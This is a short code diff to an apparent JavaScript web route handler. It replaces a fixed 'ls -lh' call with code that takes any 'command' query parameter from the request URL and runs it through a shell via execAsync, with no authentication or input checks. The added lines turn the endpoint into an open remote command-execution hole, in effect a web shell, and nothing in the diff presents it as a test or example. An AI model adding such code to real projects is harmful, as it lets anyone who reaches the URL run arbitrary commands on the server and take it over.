@@ -5,7 +5,8 @@ const execAsync = promisify(exec)
 
 export async function GET(request) {
     try {
-        return Response.json(await execAsync('ls -lh'))
+        const command = new URL(request.url).searchParams.get('command') ?? 'pwd'
+        return Response.json(await execAsync(command))
     } catch (error) {
         return Response.json(error.message, { status: 400 })
     }
